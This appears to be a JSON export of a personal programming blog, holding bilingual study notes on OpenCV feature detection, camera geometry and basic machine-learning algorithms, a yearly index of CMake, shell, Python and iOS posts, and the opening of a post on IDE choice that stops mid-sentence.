[{"title":"OpenCV读书笔记","date":"2020-03-19T15:00:00.000Z","path":"2020/03/20/OpenCV00读书笔记/","text":"致谢 感谢 沈同学 在学习过程中的指导 感谢 陆赫冉 对英文语法的校正和修改工作 OpenCV 自学源码和部分笔记所有OpenCV-Python Tutorials内的教程 所有章节均使用Python完成实现，并且发布代码至opencv-turtorial-notes 其中几个比较核心知识点的笔记，在代码备注中存在一份，单独整理出来如下 Feature 特征点Scale-Invariant Feature Transform Speeded-Up Robust Features Features from Accelerated Segment Test Binary Robust Independent Elementary Features Oriented FAST and Rotated BRIEF Camera 相机Camera Calibration Pose Estimation Epipolar Geometry Machine Learning 机器学习K-Nearest Neighbour Support Vector Machines K-Means Clustering OpenCV 思维导图 後記故事还要从2015年5月说起，那一年的夏天，我硕士生毕业了。毕业答辩上我的带有一行行错别字的作文，被老师评了80多分。 说实话这个分并不算差，能得这么高分的原因，大概也是因为毕业作文的题目和在座的诸位一样，读起来那是相当的朗朗上口，平仄有律，就一点不太好，不太容易看懂。 当初大概除了我，还有另外一个人能看懂，很可惜，这个人并不是我导师，而是万能的主。 时光荏苒，白驹过隙，五年过去之后，回过头来，应该只有主能看懂了。 每当梦境进行到这一幅画面时，我内心的想法仿佛是这个电影的画面音一样，一点点增大增大再增大，直到音量扭曲了整个胶卷和画面，只剩下卓别林式的一行话 “因为老子也不知道我论文里写的啥JB玩意啊。。。。。” 工作中每每看到这些曾经伴随我校园时光的名词术语时，总会有一丝丝的遗憾 为了不愧对于我的“通信与信息系统——工学硕士”这个张薄纸，我只好 加入了9.9学Python 走上职场巅峰 一点点啃官方教程 在啃教程的时间里，终于有一个人叩门而入，并向我喊道： “全世界的无产阶级，联合起来 Огонь по готовности!” 在共同打守望先锋打友谊下，达瓦西里·沈教授了我过去遗失的技能。 终于，在2020年疫情还未散去的春天，樱花飘满了目黑川的东京，我终于知道我硕士毕业论文写的是什么了！","tags":[{"name":"Collection","slug":"Collection","permalink":"http://yoursite.com/tags/Collection/"},{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Machine Learning Note(III) K-Means","date":"2020-03-10T15:00:00.000Z","path":"2020/03/11/OpenCV11KMeansNotes/","text":"Q1: What is Clustering?find k labels of a set of data and divide data to k by labelslike T-shirt size example in document Q2: Why do we need clustering?it gives a label to the raw data considering in knn, svm training data stage, we need some responses to tell us what is data, how can we get responses? assign data one by one manually some algorithm categorizes data set automatically clustering is the second choice Q3: Why does k-means sound so familiar?in video chapter, we use mean-shift track motive object track.actually, mean-shift and k-means clustering have some similar points they all calculate the mean value and repeat they all need criteria to stop repeat they all shit the center in every repeat Q4: What’s the main problem of k-means clustering?they are two problems of k-means clustering how to choose the category number k how to choose the initial centroids of each category Q5: Do we have other clustering algorithms?yes, something like Mean-Shift Clustering Density-Based Spatial Clustering of Applications with Noise (DBSCAN) Expectation–Maximization (EM) Clustering using Gaussian Mixture Models (GMM) Agglomerative Hierarchical Clustering","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Machine Learning Note(II) SVM","date":"2020-03-09T15:00:00.000Z","path":"2020/03/10/OpenCV10SVMNotes/","text":"Q1: What is SVM(Support Vector Machines)?from the document 1&quot;So what SVM does is to find a straight line (or hyperplane) with largest minimum distance to the training samples.&quot; SVM just like KNN, it is also a “classification algorithms” Q2: What problem does SVM want to solve? save the memory!!! like document refer( according to the document,) 1&quot;In kNN, for a test data, we used to measure its distance to all the training samples and take the one with minimum distance. It takes plenty of time to measure all the distances and plenty of memory to store all the training-samples......., should we need that much?&quot; Q3: What concepts in SVM? Decision Boundary: the imaging line boundary that can separate samples on plane Linear Separable/Non-Linearly Separable: “Linear Separable” means if all samples locate on a plane, it can be separated by line but if the dimensional of sample data is not 2D, how can we separate it by line? this situation called “Non-Linearly Separable” Support Vectors: the problem svm want to solve is knn need large memory can save all samples distance, svm only need the samples near the “Decision Boundary”, the samples take part in calculating “Decision Boundary” is “Support Vectors” which means “support to calculate” Support Planes: the imaging lines which plus positive/negative offset with “Decision Boundary”, or the lines passing through “Support Vectors” it can improve the classify result accuracy by beyond the planes. Weight Vector/Feature Vector/Bias: “Decision Boundary” is a line, we can present it as 1ax+by+c &#x3D; 0 or more professional 1w1x1 + w2x2 + b &#x3D; 0 &#x3D;&gt; w^Tx + b &#x3D; 0 which 12345w^T &#x3D; [w1, w2]x &#x3D; [x1, x2]w is &quot;Weight Vector&quot;x is &quot;Feature Vector&quot;b is &quot;Bias&quot; if sample data dimension not 2D, the length of w,x can be n 1w &#x3D; [w1, w2 ... wn], x &#x3D; [x1, x2 ... xn] C: a constant value by samples distribution or experiencejust like the k of KNN, magic number in most of the time ξ: the error value of misclassification data, from document: 1234&quot;It is the distance from its corresponding training sample to their correct decision region.For those who are not misclassified .... their distance is zero.&quot; it means if a sample is correctly classified, the 1. classified: ξ = 0 2. misclassified: ξ = distance to &quot;Support Planes&quot; Gamma: the parameter γ of a kernel function during decrease dimension to 2D Q4: How to deal with “Non-Linearly Separable” ?for the data not 2-dimensional which can’t be divided into two with a straight line. we can just map it to 2D model(!!), so we can separate it by line. d &lt; 2(one dimension): map it with added dimension, like (x) =&gt; (x, x^2) d &gt; 2(three or higher dimension): decrease the higher dimension to 2-dimension via “kernel function”, like the document example 12345678910111213141516171819attention:!! the document write wrong here, lose pow symbols in line (*)2d point: p&#x3D;(p1,p2), q&#x3D;(q1,q2).3d point: ϕ(p) &#x3D; (p21, p22, 2sqrt(p1p2) ), ϕ(q)&#x3D;(q21, q22, 2sqrt(p1p2) )define a &quot;kernel function&quot; K(p,q)which does a dot product between two 3d points:K(p,q) &#x3D; ϕ(p).ϕ(q) &#x3D; (p21, p22, 2sqrt(p1p2) ).(q21, q22, 2sqrt(p1p2) ) &#x3D; (p1q1)^2 + (p2q2)^2 + 2p1q1p2q2 * &#x3D; (p1q1+p2q2)^2 &#x3D; (pq)^2 It means,a dot product in three-dimensional space can be achieved using squared dot to product in two-dimensional space. Q5: What’s the main problem of SVM?How to pick the C value from document 1&quot;How ( In which way?)should the parameter C be chosen? It is obvious that the answer to this question depends on how the training data is distributed. (Obviously, the ....) Although there is no general answer.&quot; formula: min L(w,b0) = ||w||^2 + C * ∑(ξ) Large values of C: less misclassification errors but a smaller margin. in this case it is expensive to make misclassification errors. since the aim of the optimization is to minimize the argument, few misclassifications errors are allowed. Small values of C: bigger margin and more classification errors. in this case the minimization does not consider that much the term of the sum. so it focuses more on finding a hyperplane with big margin.","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Machine Learning Note(I) kNN","date":"2020-03-08T15:00:00.000Z","path":"2020/03/09/OpenCV09KNNNotes/","text":"Q1: What is kNN(k-Nearest Neighbor)?from the document “kNN is one of the simplest classification algorithms available for supervised learning.” Q2: What problem does KNN want to solve? “classification algorithms” is the key point take one unclassified input data in to some predefined classes is a classification Q3: What concepts in KNN? train data: because kNN need predefined pairs during the algorithms,the data making pairs is training data responses: responses are training data classified results, responses size should be equal to train data test data: a list of input data, each input data should be classified as one result of responses labels: the result of test data, same as responses, but with a different name distance: the number for judging neighbors, k nearest denote k minimums Q4: What’s the main problem with kNN?from document 1&quot;But there is a problem with that. Red Triangle may be the nearest. But what if there are a lot of Blue Squares near to him? &quot; if the number of red/blue are equal, the location of red/blue distribute maybe not, is it import? how to choose the import k? we are supposing all k neighbors are with equal importance? Is it justice?","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Camera Note(III) Epipolar Geometry","date":"2020-03-07T15:00:00.000Z","path":"2020/03/08/OpenCV08EpipolarGeometryNotes/","text":"Q1: What problem does epipolar geometry want to solveuse more than one camera to find the depth information loosen by taking an image using a pin-hole camera Q2: How to understand epipolar meansthe prefix “epi” from Greek epi ‘upon, near to, in addition’. which denote the concept “space around” “polar” from the word “pole” “pole” means “a long, slender, rounded piece of wood or metal, typically used with one end placed in the ground as a support for something” so the “polar” in geometry field is explained in “the straight line joining the two points at which tangents from a fixed point touch a conic section.” the final explanation of “epipolar geometry” is the geometry use the thin line(polar) to find the space information(epi-) Q3: What concepts in this algorithm EPILINE: document refers 1&quot;The projection of the different points on OX form a line on the right plane (line l′).&quot; the point is the projection on the right image, it is pixels on image coordinate epiline corresponding to the point x on the left image it can be described as “epipolar constraint” EPIPOLAR CONSTRAINT: from the document 1&quot;It means, to find the point x (correspond pixel location) on the right image,search along this epiline. It should be somewhere on this line&quot; the document adds 1&quot;Think of it this way, to find the matching point in other images, you need not to search the whole image, just search along the epiline.So it provides better performance and accuracy&quot; EPIPOLAR PLANE: all points will have its corresponding epilines in the other image. look at the image on the document to understand EPIPOLE: right camera projection pixel location on left image called “epipole” Q4: How to find epipolar lines and epipoles above?to find them, we need two more ingredients, Fundamental Matrix (F) and Essential Matrix (E). Q5: The difference between Fundamental &amp; Essential Essential Matrix : contains information about translation and rotation, which describes the location of the second camera, relative to the first in global coordinates. Fundamental Matrix : contains the same information as Essential Matrix in addition to the information about the intricacies of both cameras, so that we can relate the two cameras in pixel coordinates. (If we are using rectified images and normalize the point by dividing by the focal lengths, F=E). because Essential is a subset of Fundamental, we can say Fundamental Matrix F maps a point in one image to a line (epiline) in the other image.","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Camera Note(II) Pose Estimation","date":"2020-03-06T15:00:00.000Z","path":"2020/03/07/OpenCV07PoseEstimationNotes/","text":"Q1: Why do we need to pose estimation?from document referring to “how the object is situated in space, like how it is rotated”, what means to know how an object place in 3D space, but render on 2D plane image, the core idea is converting a 3D point to a 2D pixel point it is a project from 3D coordinate to 2D coordinate Q2: How to estimate?convert the problem to “where the camera position in 3D space, if shot the image(chessboard) vertical in Z, and parallel in XY plane” then from the document said “we can assume Z=0, such that, the problem now becomes how the camera is placed in space to see our pattern image.” Q3: How does it work? we just prepare some vertex find rotate &amp; transform vectors from camera matrix &amp; distort coefficients then project vertex to pixel use vectors draw those vertexes","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Camera Note(I) Calibrate","date":"2020-03-05T15:00:00.000Z","path":"2020/03/06/OpenCV06CameraCalibrationNotes/","text":"Q1: Why need to calibrate?Because photo will be distorted after camera shot, the reason is light refract Q2: What kinds of distortion exist?Two major kinds of distortion are RADIAL DISTORTION(径向畸变) and TANGENTIAL DISTORTION(切向畸变). Q3: Which distortion will effect image Radial distortion causes straight lines to appear curved. Tangential distortion causes “some areas in the image may look nearer than expected.” Q4: What caused distortion?The actual reason is pinhole cameras theory design, the physical reason is light refraction radial distortion occurs because light has different lengths to pinhole via different refraction tangential distortion occurs because the image-taking lens is not aligned perfectly parallel to the imaging plane. Q5: What is needed for correct distortion?Need intrinsic and extrinsic parameters Intrinsic parameters are specific to a camera. Extrinsic parameters correspond to rotation and translation vectors which translates a coordinates of a 3D point to a coordinate system. Q6: Intrinsic parameters contain?They include information like focal length (fx,fy) and optical centers (cx,cy).","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Feature Note(V) ORB","date":"2020-03-04T15:00:00.000Z","path":"2020/03/05/OpenCV05ORBNotes/","text":"Paper:http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.370.4395&amp;rep=rep1&amp;type=pdf ORBORB algorithm full name is “Oriented FAST and Rotated BRIEF” which means ORB use detector like FAST to find potential corners, the document said “basically a fusion of FAST” ORB use descriptors like BRIEf to describe keypoints, the document said “rBRIEF” FAST algorithm isn’t “rotate invariant”, ORB add orientation to it BRIEF descriptor isn’t as good as original after rotate, ORB use greedy search to solve it Q1: How to assign FAST algorithm an orientation?use “intensity centroid” point and “center” point as the vector direction use image moments(图像矩) calculate the “intensity centroid”, refer to 03-contours-feature In order to get rotate invariant ORB must rotate BRIEF to domain orientation(called steer in the document) but BRIEF will lose accurate after rotating. Q2: BRIEF is rotation sensitivity, why?BRIEF has a large variance and a mean near 0.5 if it rotated to domain orientation, the points in the image left &amp; right corner. that relative to domain orientation will look similar, then the variance will decrease Q3: How to promote the rotated(steered) BRIEF result?in paper use leaning method base on PASCAL 2006 set data Run each test against all training patches. Order the tests by their distance from a mean of 0.5, forming the vector T. Greedy search then the document said 1&quot;a greedy search among all possible binary tests to find the ones that have both high variance and means close to 0.5&quot; get the final result rBRIEF Q4: How about the scale-invariant of ORB?from the paper it talks a little about this 1&quot;FAST does not produce multi-scale features. We employ a scale pyramid of the image, and produce FAST features(filtered by Harris) at each level in the pyramid.&quot; but no detail of this chapter IN CONCLUSION:ORB algorithm add orientation to FAST, use Harris filtered in pyramids and solve the rotation sensitivity of BRIEF","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Feature Note(IV) BRIEF","date":"2020-03-03T15:00:00.000Z","path":"2020/03/04/OpenCV04BRIEFNotes/","text":"Paper:http://www.gwylab.com/download/BRIEF_2010.pdf TraitBRIEF algorithm is a descriptor algorithm, not like SIFT/SURF BRIEF does not care about how to find potential corners BRIEF only contains a descriptor design BRIEF can be combined with FAST keypoints result BRIEF essential is SOLVING THE MEMORY PROBLEM like the document said SIFT/SURF .. 1&quot;Creating such a vector for thousands of features takes a lot of memory which are not feasible for resource-constraint applications especially for embedded systems.&quot; HowHow to save the memory ? Replace calculate float number by compare with binary stream Hamming Distance. Not generate too complicated descriptor in memory method1 is also useful in SIFT/SURF process, BUT … 1&quot;we need to find the descriptors first, then only can we apply hashing, which doesn&#39;t solve our initial problem on memory.&quot; method2 actually solve the memory problem there are 3 main steps refer from official document selects a set of nd (x,y) location pairs around keypoint in a unique way compre the point p,q pixel intensity in each pair, an record the result with 0/1 take the result binary stream(binary string) as a descriptor about the “around” in paper it define as S x S area in openCV which default value S = 31 about the “unique way” detail can be explained in paper, in summary mean value sample p,q obey same gauss distribution sample p,q obey different gauss distribution sample use polar coordinate system p is fix to (0,0) then q around to p Orientation Sensitivity:From paper we can know 1&quot;BRIEF is not designed to be rotationally invariant....it tolerates small amounts of rotation&quot; from experience if rotate angle should less than 30 degree IN CONCLUSION:BRIEF descriptor not use the data as a descriptor, using the result calculate by data as descriptor","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Feature Note(III) FAST","date":"2020-03-02T15:00:00.000Z","path":"2020/03/03/OpenCV03FASTNotes/","text":"Paper:http://dev.ipol.im/~reyotero/bib/bib_all/2008_Roster_Porter_Drummond_faster_better_corner_detection.pdf DifferFAST algorithm not like SIFT/SURF in two points FAST is focusing on looking at potential corners, fast enough in real-time FAST does not contain a descriptor design like SIFT FAST algorithm has two versions in 2006 and 2010 2006: it just gives a proposal on how to search a corner point 2010: it improves the accuracy with machine learning HERE WE ILLUSTRATE SOME IMPORT SENTENCE IN THE ARTICLESENTENCE 1:From the article, we know the essential definition: 1234567&quot;The original detector classifies p as a corner, if there exists a set of n contiguous pixels in the circle which are all brighter than the intensity of the candidate pixel Ip plus a threshold t, or all darker than Ip − t&quot; comment: n: n = 12 in this case Ip: Intensity of Pixel(Point) what means a gray value t: threshold, filter is [0, Ip - t) &amp; (Ip + t, 255] SENTENCE 2:Now the problem convert to “how to detect the contiguous pixels fast”, answer is detecting with diagonal points of the 16 pixels the article said: 123456789&quot;The high-speed test examines pixels 1 and 9.If both of these are within t if Ip, then p can not be a corner.If p can still be a corner, pixels 5 and 13 are examined.If p is a corner then, at least three of these must all be brighter than Ip + t or darker than Ip − t.If neither of these is the case, then p cannot be a corner.&quot; BUT THERE ARE SOME WEAKNESSES if more details, please read the article &amp; document not good when n != 12 (article) not optimal (article) data waste (document) too close (article) HOW TO SOLVE THESE WEAKNESSES 1,2,3: use machine learning ID3 algorithm to create a decision tree 4: use the nonmax suppression to refine the result ID3 algorithm: train from some images contain keypoint create a table of point1, intensity, a new bool value indict if it is a keypoint use the formula Hg = H(P) − H(Pd) − H(Ps) − H(Pb) calculate the gain once the “decision tree” is created, can be used in FAST nonmax suppression: sum the area intensity around every p, then keep the max in a distance","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Feature Note(II) SURF","date":"2020-03-01T15:00:00.000Z","path":"2020/03/02/OpenCV02SURFNotes/","text":"SpeedSURF algorithm’s target is speeding up SIFT via 4 methods METHOD1 : Use Integral-Image(积分图像) replace DoG METHOD2 : Use box filter replace resize layer in octave METHOD3 : Use Haar-Wavelet replace histogram during orientation block METHOD4 : Reduce descriptor dimension, using flag to give up rotation invariance Source Codehere we can get more information from source code https://github.com/opencv/opencv_contrib/blob/master/modules/xfeatures2d/src/surf.cpp EssentialHere we pickup some essential verbose of the official document Essential 1: “ “SURF: Speeded Up Robust Features” introduced a new algorithm called SURF. As name suggests, it is a speeded-up version of SIFT.” Essential 2: “In SIFT, Lowe approximated Laplacian of Gaussian with Difference of Gaussian for finding scale-space. SURF goes a little further and approximates LoG with Box Filter” Essential 3: “For many applications, rotation invariance is not required, so no need of finding this orientation, which will speed up the process.” Then compare SURF with SIFT step by step 1. Prepare images &amp; search extrema1-1. Prepare Integral-Image Source Code Hint: SURF_Impl::detectAndCompute() Compare With SIFT: same: None, SIFT does not contain this step differ: SIFT will first resize the input image to multiples, then apply gauss blur SURF use “integral(img, sum, CV_32S);” at line 938 get Integral-Image at first, then use fastHessianDetector() create Prymaids &amp; Octaves 1-2. Fill up Prymaids &amp; Octaves Source Code Hint: fastHessianDetector() &amp; calcLayerDetAndTrace() Compare With SIFT: same: turn single input image to Prymaids count * Octaves count images differ: In SIFT the size of different octaves not equal In SURF the size of each images equals to original image size SIFT use gauss blur (differnet sigma) &amp; substract to get DoG SURF use Hessian Matrix (differnet step) as kernel do convolution Speed Up Reason: (METHOD1 METHOD2) Hessian Matrix computer is faster than gauss blur during convolutecaused by the help of Integral-Image 1-3. Find extrema point Source Code Hint: SURFFindInvoker::findMaximaInLayer() Compare With SIFT: almost same, use 26 pixels around in space 2. Keypoint Localization2-1. Non-maxima suppression Source Code Hint: SURFFindInvoker::findMaximaInLayer() - Line417 Compare With SIFT: same: just like the SIFT refines the potential points to keypoint differ: SIFT need to flatten the keypoints to origin coordinate SURF did not resize the images, alternate with different step box filter, no need the flatten step 3. Orientation Assignment3-1. Statistics wavelet value in 6 area of 360 degree Source Code Hint: SURFInvoker() + ORI_RADIUS Compare With SIFT: same: this step aims for making sure the orientation differ: SIFT use histogram with 36bins SURF use the sum of wavelet value of area SIFT has a main orientation and multiple associate orientations with 80% threshold SURF just precision in a radius area with max sum value in 6bins SURF can use upright flag for giving up this step Speed Up Reason: (METHOD3) addition runs faster than histogram compare, flag can skip this step 4. Keypoint Descriptor4-1. Neighborhood pixels &amp; Rotate Source Code Hint: SURFInvoker()-operator()-PATCH_SZ Compare With SIFT: same: select an area around the keypoint, then divide to block differ: SIFT select fix area by pixel size 16 * 16 , block size is 4 * 4 SURF use dynamic area by window via “int win_size = (int)((PATCH_SZ+1)*s);”, then divide the window area to 4 * 4 = 16 sub-region (same as block), not depend on the pixels number 4-2. Represent sub-region with 4 length vector Source Code Hint: SURFInvoker()-operator()-Line780 Compare With SIFT: same: each block/sub-region has own vector differ: SIFT use a small histogram with 8bins representing block SURF use a sub region accumulate v=(∑dx,∑dy,∑|dx|,∑|dy|) SURF can use flag extend the vector size to 8, by divide the dx and |dx| in dy&lt;0 and dy≥0 4-3. Assembly to descriptor Source Code Hint: SURFInvoker()-operator()-Line850 Compare With SIFT: same: descriptor consist of block/sub-region vector differ: SIFT descriptor size is fix 16 sub 4*4 block * 8bins = 128 SURF can use flag switch between 16 sub-region * 4 vector = 64 and 16 sub-region * 8 vector divide by zero = 128 Speed Up Reason: (METHOD4) addition of intergal-image value run faster Refer:https://zzzzzch.github.io/2017/12/23/Surf/ https://www.cnblogs.com/gfgwxw/p/9415218.html","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"OpenCV Feature Note(I) SIFT","date":"2020-02-29T15:00:00.000Z","path":"2020/03/01/OpenCV01SIFTNotes/","text":"Notescomment phase of the algorithm for official document Source Codehere can get more information from source code https://github.com/opencv/opencv_contrib/blob/master/modules/xfeatures2d/src/sift.cpp 1. Scale-space Extrema Detection1-1. Pyramids &amp; Octaves Source Code Hint: buildGaussianPyramid() process the input image to a scale Pyramids then in each scale layer, multiple the image with GaussBlur in different sigma the group of the same scale including different GaussBlur result is called “octave” in this step algorithm transform a single image to Pyramids layer count * Octaves count images 1-2. Create DoG(Difference of Gaussian) in octaves Source Code Hint: buildDoGPyramid() the algorithm use DoG to replace LoG(Laplacian of Gaussian) to save time in step 1-1, images in each octave are GaussBlur result the algorithm need is “Difference of Gaussian” to make the different gauss image need subtract adjacent GaussBlur image in the document illustrated, each octave count from 5 to 4 after subtract in the source code , nOctaveLayers+3 become nOctaveLayers+2 in function buildDoGPyramidComputer 1-3. Find extreme point from multiple layer space Source Code Hint: findScaleSpaceExtremaComputer()-operator() Key Role: make the SIFT get Scale Invariable ability after preparing the DoG images in an octave of one scale, search the extreme point of local comparing the pixel near the target point to find the extreme value near area means the 8 neighbor pixels, the 9 pixels above, and the 9 pixels underneath which means 1 pixel should compare with 8+9+9 = 26 pixels in close space from source code you can see a huge if condition near the line 635 then take a threshold to filter the potential points with extrema value 2. Key point Localization2-1. Refine the potential points to keypoint Source Code Hint: adjustLocalExtrema() the step 1-3 extreme points are not the keypoints, because of edges effect we need to refine the keypoints to get more accurate points. the method is to use Taylor series expansion (to understand this, we need more mathematic knowledge) then pick up a threshold to filter the result. the result of stage1 is the keypoint in the Pyramids * Octaves space, not a flat image 2-2. Flatten the keypoints to origin size coordinate Source Code Hint: adjustLocalExtrema() the stage2 is flattening those points to the origin image coordinate, so that we can do the “Orientation Assignment” step, near line 569, you can examine assigning of point (x, y) 3. Orientation Assignment3-1. Use 36 bins histogram to calculate the main direction Source Code Hint: calcOrientationHist() Key Role: make the SIFT get Rotate Invariable ability loop the keypoint, remove the duplicate point. A neighborhood is taken around the keypoint, calculate the gradient, divide 360 degrees to 36 bins to generate a histogram. take the max value as the main direction keep the 80% value of max as an associate direction then whatever the image rotate, the same area main orientation will not change 4. Keypoint Descriptor4-1. Neighborhood pixels &amp; Rotate Source Code Hint: calcOrientationHist() once the orientation is made, use the 16*16 pixel square with the keypoint as center calculate descriptor. divide the 16*16 square to 16 small square (call it “block”) with 4*4 size, each pixel in the block calculate the gradient, then 16 gradient number is token at one block 4-2. The second histogram with 8 bins Source Code Hint: calcSIFTDescriptor() + SIFT_DESCR_HIST_BINS now we need a new histogram to represent the block, not the same histogram in step 3-1 block histogram use 8 bins represent 360 degree, the reason using 8 bins is there are only 16 candidate gradient in a block 4-3. Assemble the block histogram to the descriptor Source Code Hint: calcSIFTDescriptor() + float* dst calculate each block histogram with 8 bins, store the 8 bins value to last parameter dst, 16 * 16 divided to 16 blocks the final descriptor is a vector with 16 * 8 = 128 size, every 8 elements of this vector represent a block histogram 5. Keypoint Matchingthis step is not the SIFT algorithm itself it emphasizes algorithm is used for stitching images, should pick an appropriate threshold to get a better result. sometimes the closet-distance is not as good as the second candidate Refer:https://blog.csdn.net/zddblog/article/details/7521424","tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"http://yoursite.com/tags/OpenCV/"}]},{"title":"2018-2019年的文章","date":"2019-12-24T15:00:00.000Z","path":"2019/12/25/2018-2019年的文章/","text":"记2017年的文章吐槽加班加到吐血，2018年被公司教育了什么才是真的吐血 其实钱越来越少才是主要的 工作越来越久，感觉能写Blog的时间反而越来越少，才导致两年都没更新 CMake我一直希望能做一个真正的Full Stack Engineer，而不是JS Stack Engineer 2019年也意识到C++是每个工程师的必修课，无论你工作中用不用他 这是一系列根据团队经验总结的跨平台生产环境多人协作情况下CMake从零到一的构建文章，配合源代码cmake-tutorial-sample可以查看详细细节 鸣谢鸣谢2019年在卢协某和卢某棠为主的众多同事引导下，学习了这样那样许多许多C++的姿势，终于知道自己并不能21天精通C++了 鸣谢优秀的东京帝国大学毕业生沈同学和东京知名小V雪月秋水@acgotaku311的谆谆教导，帮我完成这个系列 序CMake00编译的基本概念 源代码开始CMake01构建HelloWorld CMake02编译配置DebugRelease CMake03添加文件和产物 CMake04添加第三方库 CMake05函数和宏的对比 CMake06加载文件进行复用 CMake07多工程协作 CMake08跨平台编译最佳实践：跨平台的最佳实践在这一节 CMake08跨平台编译iOS细节 CMake08跨平台编译Android细节 CMake08跨平台编译WebAssembly细节 后记CMake09如何读懂复杂文档 CMake10不同IDE的差别和选择： 这个章节讲了如何用VSCode 在一个多人的团队中，技术栈不同，知识面不同、经验不同、上下文不同的情况下，协作起来难度十分的高，根据个人经验这是最无障碍的实践了，希望可以帮助到别的跨平台团队 Script为什么投入了这么多时间在脚本相关的知识上 因为在加班的过程中，终于意识到工程师的最大价值就是自动化，自动化才能带来生产力提升，生产力才是商业中最核心的竞争力。 那么为了提高生产力，应该投入多少就会困扰很多人，根据个人经验总结 如果能花20倍的时间，把一个手动的工作变成自动，那么就应该去花这20倍的代价 所以说日常你有什么十分钟的操作，就值得花上一下午让他变成脚本 Python三连01脚本参数设定和解析 Python三连02如何使用正则获取变量 Python三连03Json的读写 Python三连04获取键盘输入到变量 Python三连05相等和类型判断的细节 Shell三连01脚本参数设定和解析 Shell三连02如何使用正则获取变量 Shell三连03文件的读写和重定向 Shell三连04条件命令和管线Pipe命令 Shell三连05递归遍历目录处理文件 Shell三连06如何读懂shell说明书man Shell三连07STDIN重定向执行字符串 Shell三连08键盘输入到变量 Shell三连09获取shell命令的返回值 Shell三连10字符串转数字 Shell三连11内置函数字符串处理 Shell三连12开启后台任务 Shell三连13指令sed Shell三连14指令grep Shell三连15自动补全Framework的头文件 Shell三连16查询本机的Xcode证书 HTTPS我觉得这个章节需要好好看看，因为面试最容易出现 当然更多是因为一直在读一本书 Computer Networking: A Top-Down Approach Featuring the Internet 但是一直读的很慢，愁人 因为日常工作，需要对传输控制层有足够对了解，应用层里大家最关心的就是HTTPS咯 HTTPS协议从顶至底解析 Layout因为一直在做跨平台的工作，和设计交流的时候每个工程师思考布局的方式都不太一样，看看不同布局思维还蛮有意思的 不过最近又出了Flutter、SwiftUI等等，我觉得兜兜转转最终大家还会走到Web的布局思路上吧 Android、iOS、Web布局对比解析 源代码仓库LayoutSample iOS其实这两年iOS工作做的比较少，大部分也都是一些刁钻古怪的问题，真希望能快点在生产上写Swift啊 判断是否使用了模拟器 iOS8旋转动画禁止的更新 iOS11可用容量读取的改变 CollectionView常见Crash处理 保存媒体到相册的一些问题 ImageView模仿系统相册缩放 NSOperation和NSOperationQueue的基础用法 iOS储存自定义类进入UserDefaults CMTime的含义和取值方法 OC实现链式调用 iOS崩溃闪退Crash分析原因 IPA安装包下载和重签名 DSYM符号文件的相关配置 C语言位域和字节对齐相关问题 C语言高级宏定义关键字和操作符 结语2019年有机缘巧合来到了东京分公司，希望可以在2020年多认识 JK (许愿…) 12345678910111213141516/* * For the brave souls who get this far: You are the chosen ones, * 对那些耐下心思看到这里的哥们，容我说一句您真不容易 * * the valiant knights of programming who toil away, without rest, * 想必您不是东哥的兄弟，就是修过马老师的福报，或说带过牢厂的手环，也许在猪厂写着公众号 * * fixing our most awful code. To you, true saviors, kings of men, * 能看完我啰哩啰嗦的博客，对于你，小马哥的氪金之王，比特蹦迪的大帝 * * I say this: * 我想问： * * &quot;Old brother，does your company have any head count to hire me？&quot; * “大兄弟，贵厂还要人吗？” */ 好想有机会去东京谷歌或者巨硬工作啊。。听说又闲钱又多。。。","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Collection","slug":"Collection","permalink":"http://yoursite.com/tags/Collection/"},{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"},{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"},{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake后置-IDE的选择和VSCode配置细节","date":"2019-12-09T15:00:00.000Z","path":"2019/12/10/CMake10不同IDE的差别和选择/","text":"IDE如何选择IDE的概念是集成开发环境（Integrated Development Environment） 所谓集成就是集中了编译配置、编译、调试等功能，例如Xcode、Android Studio、CLion等 方便开发者专注于代码逻、快速实现功能或者减少指令输入 不过随着集成开发环境加入了越来越多的东西，变得越来越卡，现在也出现了简化的趋势，例如VSCode的流行 CLion如何工作使用 CLion 创建一个 “New Project —— C++ Executable” 的工程，可以发现其根目录为 1234----Project --cmake-build-debug --CMakeLists.txt --main.cpp 对应该系列的第一篇文章HelloWorld可以发现 CLion也是使用CMake来组织工程 点击菜单栏 “Run” 存在 “Build、Run、Debug” 三个选项，指定一个断点，然后点击Debug就可以进行调试 操作工程你会发现以下几个重点 “cmake .” 产生的一系列文件被放在了 cmake-build-debug 在根本的任何改动，都会使得CMakeLists.txt变化，并且刷新工程 和Xcode不一样，CLion没有模糊编译、运行、调试的概念 CLion中 Build不会执行程序、Run的话断点不会停止、Debug才是Xcode的 Command+R 由于CLion 变的越来越卡了（2018年6月——2019年9月），导致很多人选择使用更加轻量级的VSCode来开发 VSCode的配置、编译、调试VSCode就对程序员的专业程度要求比较高了，下载官方的C/C++插件之后 根据官方教程可以完成配置、编译、调试三个步骤 命令台（Command Palette）和命令行（Shell Command）工具code命令台有两种打开方法 点击菜单栏 “View —— 